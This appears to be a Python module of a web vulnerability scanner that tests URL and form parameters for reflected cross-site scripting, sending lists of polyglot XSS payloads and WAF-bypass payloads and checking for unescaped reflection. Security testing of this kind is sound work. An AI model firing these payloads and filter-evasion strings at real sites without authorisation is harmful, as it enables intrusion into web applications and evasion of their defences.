from typing import Optional
import requests

from aimy.tools.log_utils import get_logger
from aimy.tools.http_client import build_url
from aimy.tools.payload_engine import generate
from aimy.tools.html_context_parser import probe_and_detect
from aimy.tools.settings import settings
from aimy.tools.base_detector import BaseDetector

logger = get_logger("xss_detector")

REFLECTION_MARKERS = ["XSS_TEST_%d" % i for i in range(100, 160)]

POLYGLOT_PAYLOADS = [
    '"><svg onload=alert(1)>',
    "'-alert(1)-'",
    '\\";alert(1);//',
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '{{constructor.constructor("alert(1)")()}}',
]

# WAF bypass payloads — target common blacklists
# (onfocus/ontoggle/marquee often not blocked when onerror/onload are)
WAF_BYPASS_PAYLOADS = [
    '<input autofocus onfocus=alert(1)>',         # onfocus not in common blacklists
    '<details open ontoggle=alert(1)>',           # ontoggle not in common blacklists
    '<marquee onstart=alert(1)>',                 # marquee + onstart, rarely blocked
    '<img src=x onfocus=alert(1) autofocus>',     # img with onfocus
    '<video><source onerror=alert(1)>',           # source onerror, different from img
    '<body onfocusin=alert(1)>',                  # onfocusin alternative
    '<svg><animate onbegin=alert(1)>',             # SVG animate onbegin
    '<a href="javascript:alert(1)">click</a>',    # javascript: protocol
    '"><iframe src="javascript:alert(1)">',        # iframe with javascript
    '<math><mi xlink:href="javascript:alert(1)">', # math xlink
]

try:
    from aimy.tools.xss_browser_verify import check as browser_verify
    HAS_BROWSER_VERIFY = True
except Exception:
    browser_verify = None
    HAS_BROWSER_VERIFY = False


def _payload_reflected_unescaped(html: str, payload: str) -> bool:
    if not payload:
        return False
    if payload not in html:
        return False
    escaped = payload.replace("<", "&lt;").replace(">", "&gt;")
    return escaped not in html


def _has_unescaped_trigger(html: str) -> bool:
    triggers = ["alert(1)", "alert(1)", "onerror=", "onload=",
                "onfocus=", "ontoggle=", "onmouseover="]
    for t in triggers:
        if t in html:
            escaped = t.replace("=", "&#x3D;")
            if escaped not in html:
                return True
    return False


class XSSDetector(BaseDetector):
    """XSS detection — inherits baseline from BaseDetector."""

    def _check_impl(self, url: str, param: str, **kwargs) -> dict:
        timeout = kwargs.get("timeout", 10.0)
        post_body = kwargs.get("post_body", False)
        post_data = kwargs.get("post_data")
        context = kwargs.get("context", "all")
        waf_name = kwargs.get("waf_name")

        result = {"vulnerable": False, "type": None, "evidence": [],
                  "confirmed": False, "vector": None,
                  "needs_browser_verify": False, "confidence": "low"}

        if context == "all":
            detected = probe_and_detect(url, param, self.sess, timeout,
                                        post_body, post_data)
            if detected not in ("not_reflected", "unknown"):
                logger.debug("context probe: %s -> %s", param, detected)
                context = detected

        contexts = ["html", "attr", "js", "angular"] if context == "all" else [context]

        for ctx in contexts:
            seeds = generate("xss", ctx, "all", waf_name)
            for i, entry in enumerate(seeds):
                payload = entry["payload"]
                marker = REFLECTION_MARKERS[i % len(REFLECTION_MARKERS)]
                test_payload = marker + payload
                try:
                    if post_body and post_data:
                        d = post_data.copy()
                        d[param] = test_payload
                        r = self.sess.post(url, data=d, timeout=timeout)
                    else:
                        r = self.sess.get(
                            build_url(url, param, test_payload), timeout=timeout)

                    if marker in r.text and _payload_reflected_unescaped(r.text, payload):
                        if self.is_false_positive(marker, r, skip_size_check=True):
                            logger.debug("xss %s: baseline artifact, skip", ctx)
                            continue
                        result["vulnerable"] = True
                        result["type"] = "reflected_%s" % ctx
                        result["vector"] = payload[:80]
                        result["confidence"] = "medium"
                        result["evidence"].append(
                            "reflected %s in %s (%dB)" % (ctx, param, len(r.text)))

                        if _has_unescaped_trigger(r.text):
                            result["confirmed"] = True
                            result["confidence"] = "high"
                            result["evidence"].append("unescaped trigger detected")
                        elif HAS_BROWSER_VERIFY:
                            verify_result = browser_verify(
                                url, param, self.sess, timeout)
                            if verify_result.get("confirmed"):
                                result["confirmed"] = True
                                result["confidence"] = "high"
                                result["evidence"].extend(
                                    verify_result.get("evidence", []))
                        return result
                except Exception as e:
                    logger.debug("xss %s payload: %s", ctx, e)

        if not result["vulnerable"]:
            for payload in POLYGLOT_PAYLOADS:
                try:
                    r = self.sess.get(
                        build_url(url, param, payload), timeout=timeout)
                    if _payload_reflected_unescaped(r.text, payload):
                        if self.is_false_positive(payload, r, skip_size_check=True):
                            logger.debug("xss polyglot: baseline artifact, skip")
                            continue
                        result["vulnerable"] = True
                        result["type"] = "polyglot"
                        result["confidence"] = "medium"
                        result["evidence"].append(
                            "polyglot reflected: %s" % payload[:30])
                        result["vector"] = payload[:80]
                        if _has_unescaped_trigger(r.text):
                            result["confirmed"] = True
                            result["confidence"] = "high"
                        break
                except Exception as e:
                    logger.debug("xss polyglot: %s", e)

        # WAF bypass fallback: if standard + polyglot all fail,
        # try payloads that avoid common blacklists (onfocus/ontoggle/etc)
        if not result["vulnerable"]:
            for payload in WAF_BYPASS_PAYLOADS:
                try:
                    r = self.sess.get(
                        build_url(url, param, payload), timeout=timeout)
                    if _payload_reflected_unescaped(r.text, payload):
                        if self.is_false_positive(payload, r, skip_size_check=True):
                            continue
                        result["vulnerable"] = True
                        result["type"] = "waf_bypass"
                        result["confidence"] = "medium"
                        result["evidence"].append(
                            "WAF bypass: %s reflected" % payload[:40])
                        result["vector"] = payload[:80]
                        if _has_unescaped_trigger(r.text):
                            result["confirmed"] = True
                            result["confidence"] = "high"
                        break
                except Exception as e:
                    logger.debug("xss waf bypass: %s", e)

        return result


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0, post_body: bool = False, post_data: dict = None,
          context: str = "all", waf_name: Optional[str] = None) -> dict:
    """Backward-compatible module-level API."""
    return XSSDetector().check(url, param, sess=sess, timeout=timeout,
                               post_body=post_body, post_data=post_data,
                               context=context, waf_name=waf_name)
